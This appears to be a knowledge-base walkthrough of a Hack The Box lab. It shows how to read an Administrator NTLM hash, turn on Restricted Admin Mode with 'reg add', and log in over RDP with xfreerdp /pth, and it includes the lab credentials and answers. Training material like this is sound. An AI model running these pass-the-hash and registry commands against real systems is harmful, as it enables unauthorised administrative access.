---
tags: [lab, attack/network]
module: attacking_common_services
last_updated: 2026-05-12
source_count: 1
---

# HTB Lab — RDP: Pass-the-Hash via Restricted Admin Mode

Three-question lab: connect to RDP with provided credentials, locate an Administrator NTLM hash in a file on the desktop, enable Restricted Admin Mode via the registry, then use Pass-the-Hash to authenticate as Administrator and read the flag.

## Credentials

```
Username : htb-rdp
Password : HTBRocks!
```

Use these for all initial connections unless a different account is specified.

## Questions

1. What is the name of the file that was left on the desktop? (Format: filename.txt)
2. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?
3. Connect to RDP with the Administrator account and submit the contents of flag.txt.

## Attack Overview

```
xfreerdp as htb-rdp:HTBRocks!
        │
        ▼
Read pentest-notes.txt → find Administrator NTLM hash   ← Q1 answer
        │
        ▼
Add DisableRestrictedAdmin registry key                  ← Q2 answer
        │
        ▼
xfreerdp /pth:<hash> as Administrator
        │
        ▼
Read flag.txt                                            ← Q3 answer
```

---

## Phase 1: Connect to RDP and Find the Desktop File (Q1)

```bash
xfreerdp /v:10.129.x.x /u:htb-rdp /p:'HTBRocks!' /cert-ignore
```

Key flags:

| Flag | What it does |
|------|-------------|
| `/v:10.129.x.x` | Target IP and optional port (default 3389; use `/v:IP:PORT` if non-standard) |
| `/u:htb-rdp` | Username |
| `/p:'HTBRocks!'` | Password. Single-quote if it contains special characters |
| `/cert-ignore` | Accept the self-signed certificate without prompting. The lab server presents an untrusted cert — this skips the interactive Y/T/N prompt |

xfreerdp opens a Windows desktop window. Once inside, **open a Command Prompt** rather than clicking around the GUI:

- Press **Win+R**, type `cmd`, press Enter
- Or right-click the taskbar → Task Manager → File → Run new task → `cmd`

Once you have a CMD prompt, list the desktop contents from the command line:

```cmd
dir C:\Users\htb-rdp\Desktop\
```

You will see `pentest-notes.txt`. **Q1 answer: `pentest-notes.txt`**

---

## Phase 2: Read pentest-notes.txt and Understand the Registry Key (Q2)

The lab's original walkthrough opens the file in Notepad via the GUI. Use `type` instead:

```cmd
type C:\Users\htb-rdp\Desktop\pentest-notes.txt
```

The file contains the Administrator account's NTLM hash. Copy it — you'll need it in Phase 3.

### Why DisableRestrictedAdmin matters

By default, Windows blocks Pass-the-Hash attacks against RDP. When **Restricted Admin Mode** is enabled, the RDP client authenticates using your credentials locally (never sending them to the server in plaintext), which is the mechanism that also allows hash-based authentication via `/pth`.

The registry key that controls this is:

```
HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin
```

- Value `0` = Restricted Admin Mode **enabled** → PTH works
- Value `1` or key absent = Restricted Admin Mode **disabled** → PTH rejected

**Q2 answer: `DisableRestrictedAdmin`**

You can verify the current state without opening regedit:

```cmd
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

If the key is absent or set to `1`, proceed to Phase 3 to set it.

---

## Phase 3: Enable Restricted Admin Mode and Pass-the-Hash (Q3)

### Step 1 — Add the registry key from the existing CMD session

Still inside the `htb-rdp` RDP session, run:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

| Part | What it does |
|------|-------------|
| `HKLM\System\CurrentControlSet\Control\Lsa` | Registry hive path where LSA authentication settings live |
| `/t REG_DWORD` | Value type — 32-bit integer |
| `/v DisableRestrictedAdmin` | Value name to create or overwrite |
| `/d 0x0` | Data value: `0` enables Restricted Admin Mode |
| `/f` | Force overwrite without prompting |

Expected output: `The operation completed successfully.`

You can close the xfreerdp session — you no longer need the htb-rdp desktop.

### Step 2 — PTH with xfreerdp from your attacker machine

```bash
xfreerdp /v:10.129.x.x /u:administrator /pth:<hash_from_pentest-notes.txt> /cert-ignore
```

Replace `<hash_from_pentest-notes.txt>` with the NT hash you read in Phase 2.

| Flag | What it does |
|------|-------------|
| `/u:administrator` | Target account — built-in Windows Administrator |
| `/pth:<NT_hash>` | Pass-the-Hash: use the NTLM hash directly instead of a plaintext password |
| `/cert-ignore` | Suppress the certificate trust prompt |

### Step 3 — Read the flag without clicking

Once the Administrator desktop loads, open CMD (Win+R → `cmd`) and type:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

**Q3 answer**: the flag string printed to the terminal.

---

## If xfreerdp Cannot Open a Display

xfreerdp requires a graphical display. If you are working in a headless terminal (no X server), run it through a virtual framebuffer:

```bash
# Install if not present
sudo apt install xvfb -y

# Start a virtual display on :99
Xvfb :99 -screen 0 1024x768x24 &

# Run xfreerdp on that display
DISPLAY=:99 xfreerdp /v:10.129.x.x /u:htb-rdp /p:'HTBRocks!' /cert-ignore
```

The window will not appear on screen but the session is active. You can pipe commands in via `/drive` (shared folder) or paste them via clipboard (`/clipboard`).

For a fully non-interactive alternative, check whether WinRM (5985) or SMB is also open on the target — `evil-winrm` or `impacket-wmiexec` would let you run the registry and file commands without any display requirement. PTH for RDP specifically requires xfreerdp's `/pth` flag, so there is no pure-CLI equivalent for the final connection step.

---

## Key Concepts

| Concept | One-line explanation |
|---------|---------------------|
| Restricted Admin Mode | Windows feature that lets RDP authenticate locally, enabling PTH |
| `DisableRestrictedAdmin = 0` | Enables Restricted Admin Mode — counterintuitive naming |
| xfreerdp `/pth` | Passes an NT hash instead of a plaintext password to RDP |
| `reg add /d 0x0 /f` | CLI equivalent of editing a registry value in regedit |
| `type <file>` | CMD equivalent of opening a file in Notepad |
| `/cert-ignore` | Suppresses the interactive cert trust prompt — needed for lab self-signed certs |

## Gotchas & Notes

- The registry key must be set **before** the PTH xfreerdp attempt — if you try `/pth` first it will fail silently or show an auth error
- `DisableRestrictedAdmin = 0` means Restricted Admin is **on** — the name is a double-negative; `0` disables the restriction on Restricted Admin
- PTH via xfreerdp only works against the NT hash (second half of the `NTLM:` line). Do not pass the LM hash or the full LM:NT pair
- If the Administrator account is disabled or locked, PTH will connect but immediately disconnect — this is different from a wrong hash (which gives an auth error)
- On Windows Server 2019+ and domain-joined machines with Protected Users group, Restricted Admin Mode may be policy-blocked

## Related Pages

- [[attack/rdp]] — full RDP technique reference: spraying, tscon hijacking, PTH, BlueKeep
- [[enumeration/windows_remote_mgmt]] — RDP fingerprinting and configuration review
- [[tools/attack/crowbar]] — RDP password spraying
- [[tools/attack/hydra]] — alternative sprayer
- [[attack/smb]] — the same NT hash from pentest-notes.txt works for SMB PTH

## Sources

- raw/lab/attacking_rpd_lab.md
